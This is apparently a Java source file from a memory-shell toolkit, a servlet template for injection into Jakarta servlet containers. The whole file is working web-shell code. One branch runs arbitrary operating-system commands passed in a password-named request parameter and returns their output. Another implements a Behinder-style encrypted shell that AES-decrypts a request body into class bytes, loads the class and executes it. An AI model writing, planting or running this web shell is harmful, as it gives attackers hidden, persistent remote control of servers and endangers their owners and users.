package com.boogipop.memshell;

import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Scanner;

public class ServletTemplates extends HttpServlet {
    private static byte[] BASE64Decoder(String data){
        byte[] inputBytes = data.getBytes();
        Base64.Decoder encoder = Base64.getDecoder();
        byte[] encodedBytes = encoder.decode(inputBytes);
        return encodedBytes;
    }
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        System.out.println("[+] Dynamic Servlet says hello");

        if(request.getParameter("type") != null && request.getParameter("type").equals("basic")){
            //basic cmd shell
            String cmd = request.getParameter(Config.getPassword());
            if(cmd != null && !cmd.isEmpty()){
                String[] cmds = null;
                if(File.separator.equals("/")){
                    cmds = new String[]{"/bin/sh", "-c", cmd};
                }else{
                    cmds = new String[]{"cmd", "/C", cmd};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                response.getWriter().println(result);
            }
        }else if(request.getHeader(Config.getHeader()) != null){
            //behind3 shell
            try{
                if (request.getMethod().equals("POST")){
                    String k = Config.getBehinderShellPwdPwd();
                    request.getSession().setAttribute("u",k);
                    Cipher cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                    targetMethod.invoke(evilObject, new Object[]{request, response});
                }
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        doPost(request, response);
    }

    class U extends ClassLoader{
        U(ClassLoader c){super(c);}

        public Class g(byte []b){return super.defineClass(b,0,b.length);}
    }

    public static void main(String[] args) {

    }
}